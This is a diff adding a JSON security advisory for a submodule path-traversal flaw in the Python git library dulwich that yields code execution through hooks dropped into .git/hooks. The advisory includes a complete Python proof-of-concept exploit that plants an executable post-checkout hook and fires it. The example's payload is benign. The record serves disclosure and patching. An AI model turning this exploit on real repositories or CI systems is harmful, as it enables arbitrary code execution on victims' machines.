@@ -1,0 +1,86 @@
+{
+  "id": "PYSEC-2026-2465",
+  "modified": "2026-07-13T16:31:41.543109194Z",
+  "published": "2026-07-13T15:46:27.277510Z",
+  "aliases": [
+    "CVE-2026-52726",
+    "GHSA-gfhv-vqv2-4544"
+  ],
+  "summary": "Dulwich's submodule path traversal in porcelain.submodule_update / porcelain.clone(recurse_submodules=True) yields RCE via attacker-dropped .git/hooks payload",
+  "details": "### Summary\n\n`dulwich.porcelain.submodule_update`, and by extension `porcelain.clone(..., recurse_submodules=True)`, materializes attacker-controlled submodule paths from a crafted upstream repository without path validation. A malicious `.gitmodules` plus a matching tree gitlink whose `path` is `.git/hooks` (or any other directory inside the parent repository's `.git` directory) causes the attacker's submodule tree contents to be written directly into the victim's `.git/hooks/` directory, preserving executable mode bits. The dropped executables are then run by any subsequent `git` or `dulwich` command that invokes the matching hook, resulting in arbitrary code execution.\n\nThis is the dulwich equivalent of the upstream Git fixes for CVE-2024-32002 / CVE-2024-32004, which were never propagated into dulwich's separately implemented submodule porcelain.\n\n### Affected\n\n- **Package:** `dulwich` (PyPI)\n- **Affected versions:** `\u003e=0.23.2, \u003c1.2.5`\n- **Affected platforms:** all (Linux, macOS, Windows). Exploitation does not require a case-insensitive or NTFS filesystem, because the path written is a literal `.git/hooks` rather than a case- or short-name-aliased form.\n\nAffected entry points:\n- `dulwich.porcelain.submodule_update(repo, init=True, recursive=True)`\n- `dulwich.porcelain.clone(source, target, recurse_submodules=True)`\n- `dulwich submodule update` CLI / `dulwich clone --recurse-submodules` CLI\n\n### Vulnerable code\n\nThe submodule path from the tree's gitlink entry (and matching `.gitmodules`) is consumed without validation in [`dulwich/porcelain/submodule.py`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L234).\n\nThe attacker-controlled `path` enters the loop from `iter_cached_submodules` ([`submodule.py#L154-L168`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L168)):\n\n```python\nfor path, target_sha in submodules_to_update:\n    path_str = (\n        path.decode(DEFAULT_ENCODING) if isinstance(path, bytes) else path\n    )\n\n    submodule_name: bytes | None = None\n    for sm_path, sm_url, sm_name in read_submodules(gitmodules_path):\n        if sm_path == path:\n            submodule_name = sm_name\n            break\n\n    if not submodule_name:\n        continue\n```\n\nIt flows unchecked into `os.path.join` and the filesystem ([`submodule.py#L187-L188`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L187-L188)):\n\n```python\n            submodule_path = os.path.join(r.path, path_str)\n            submodule_git_dir = os.path.join(r.controldir(), \"modules\", path_str)\n```\n\nFinally, the attacker tree's contents are materialized into that directory via `build_index_from_tree` with no `validate_path_element` argument, defaulting to the lax validator ([`submodule.py#L229-L234`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L229-L234)):\n\n```python\n                    build_index_from_tree(\n                        submodule_path,\n                        sub_repo.index_path(),\n                        sub_repo.object_store,\n                        tree_id,\n                    )\n```\n\nThree issues compound:\n\n1. `path_str` originates from the parent repository's tree gitlink entry (attacker-controlled) and is never validated against `.git`, `..`, or other path-traversal patterns. The same value is read from the attacker-supplied `.gitmodules` blob via [`read_submodules`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/config.py#L1637-L1665), which also performs no validation.\n2. `submodule_path = os.path.join(r.path, path_str)` therefore resolves to an attacker-chosen directory anywhere on disk (e.g. `\u003cworktree\u003e/.git/hooks`).\n3. [`build_index_from_tree`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/index.py#L2034-L2044) is called without `validate_path_element`, so it defaults to `validate_path_element_default`, which only rejects literal `.git`, `.`, and `..`. It does not refuse a `root_path` that is itself inside the parent's `.git` directory, and it honors the attacker tree's file modes including executable bits (`0o100755`).\n\n### Reachability\n\nA direct production call path from a user invocation: `porcelain.clone(source, target, recurse_submodules=True)` at [`dulwich/porcelain/__init__.py:1548-1551`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/__init__.py#L1548-L1551) calls `submodule_update(repo, init=True, recursive=True)` once the parent clone completes, reaching the unsanitized loop at [`submodule.py#L154-L234`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L234).\n\nThe CLI command `dulwich clone --recurse-submodules \u003curl\u003e` reaches the same sink via [`dulwich/cli.py:2131`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/cli.py#L2131).\n\nAny service that exposes `porcelain.clone(..., recurse_submodules=True)` on attacker-supplied URLs is exposed: CI runners, repository import tools, package resolvers that use dulwich as a pure-Python git, and language-server \"fetch dependency from git\" features.\n\n### Proof of concept\n\nEnd-to-end against pip-installed `dulwich==1.2.4`, demonstrating both the path-traversal primitive and the resulting code execution when the victim subsequently runs `git`. The payload writes a marker file rather than performing any destructive action.\n\n```python\nimport os, tempfile, subprocess\nimport dulwich.repo as r\nimport dulwich.porcelain as p\nfrom dulwich.objects import Blob, Commit, Tree\n\nWORKDIR = tempfile.mkdtemp(prefix=\"dulwich-poc-\")\nATTACKER = os.path.join(WORKDIR, \"att.git\")\nVICTIM_PARENT = os.path.join(WORKDIR, \"vic_parent.git\")\nVICTIM_WT = os.path.join(WORKDIR, \"vic_wt\")\nMARKER = os.path.join(WORKDIR, \"marker\")\n\n# Attacker submodule contains a single file named \"post-checkout\"\n# with mode 0755 and a benign shell payload that writes a marker file.\nattacker = r.Repo.init_bare(ATTACKER, mkdir=True)\npayload = b\"#!/bin/sh\\necho executed \u003e \" + MARKER.encode() + b\"\\n\"\npb = Blob.from_string(payload)\nattacker.object_store.add_object(pb)\nat = Tree()\nat.add(b\"post-checkout\", 0o100755, pb.id)\nattacker.object_store.add_object(at)\nac = Commit()\nac.tree = at.id\nac.author = ac.committer = b\"a \u003ca@a\u003e\"\nac.author_time = ac.commit_time = 0\nac.author_timezone = ac.commit_timezone = 0\nac.message = b\"x\"\nattacker.object_store.add_object(ac)\nattacker.refs[b\"refs/heads/master\"] = ac.id\nattacker.refs.set_symbolic_ref(b\"HEAD\", b\"refs/heads/master\")\n\n# Victim parent has a .gitmodules and a tree gitlink, both pointing at\n# path \".git/hooks\". The gitlink targets the attacker submodule commit.\nvictim = r.Repo.init_bare(VICTIM_PARENT, mkdir=True)\ngitmod = (\n    b'[submodule \"evil\"]\\n'\n    b'\\tpath = .git/hooks\\n'\n    b'\\turl = ' + ATTACKER.encode() + b'\\n'\n)\ngmb = Blob.from_string(gitmod)\nvictim.object_store.add_object(gmb)\nvt = Tree()\nvt.add(b\".gitmodules\", 0o100644, gmb.id)\nvt.add(b\".git/hooks\", 0o160000, ac.id)\nvictim.object_store.add_object(vt)\nvc = Commit()\nvc.tree = vt.id\nvc.author = vc.committer = b\"a \u003ca@a\u003e\"\nvc.author_time = vc.commit_time = 0\nvc.author_timezone = vc.commit_timezone = 0\nvc.message = b\"v\"\nvictim.object_store.add_object(vc)\nvictim.refs[b\"refs/heads/master\"] = vc.id\nvictim.refs.set_symbolic_ref(b\"HEAD\", b\"refs/heads/master\")\n\n# Single victim call: clone with recurse_submodules=True\np.clone(VICTIM_PARENT, VICTIM_WT, recurse_submodules=True)\n\nhook = os.path.join(VICTIM_WT, \".git\", \"hooks\", \"post-checkout\")\nassert os.path.exists(hook), \"hook was not written\"\nassert os.stat(hook).st_mode \u0026 0o111, \"hook is not executable\"\n\n# git running in the victim worktree then executes the dropped hook\nsubprocess.run([\"git\", \"-C\", VICTIM_WT, \"checkout\", \"master\"], check=True,\n               capture_output=True)\nassert os.path.exists(MARKER), \"hook did not fire\"\nprint(\"Code execution confirmed:\", open(MARKER).read().strip())\n```\n\nThe trigger surface is broader than this proof of concept: the dropped file fires for any matching hook name (`post-checkout`, `pre-commit`, `post-merge`, `post-rewrite`, `post-applypatch`, and others). dulwich itself executes several hooks (`pre-commit`, `commit-msg`, `post-commit`, `pre-receive`, `update`, `post-receive`; see `dulwich/hooks.py` and `dulwich/repo.py`), so a victim using only dulwich is also reachable without upstream Git.\n\n### Credit\n\ntonghuaroot",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "dulwich",
+        "purl": "pkg:pypi/dulwich"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.23.2"
+            },
+            {
+              "fixed": "1.2.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.23.2",
+        "0.24.0",
+        "0.24.1",
+        "0.24.10",
+        "0.24.2",
+        "0.24.3",
+        "0.24.4",
+        "0.24.5",
+        "0.24.6",
+        "0.24.7",
+        "0.24.8",
+        "0.24.9",
+        "0.25.0",
+        "0.25.1",
+        "0.25.2",
+        "1.0.0",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.2.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/dulwich/PYSEC-2026-2465.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jelmer/dulwich/security/advisories/GHSA-gfhv-vqv2-4544"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-52726"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jelmer/dulwich"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/dulwich"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-gfhv-vqv2-4544"
+    }
+  ]
+}
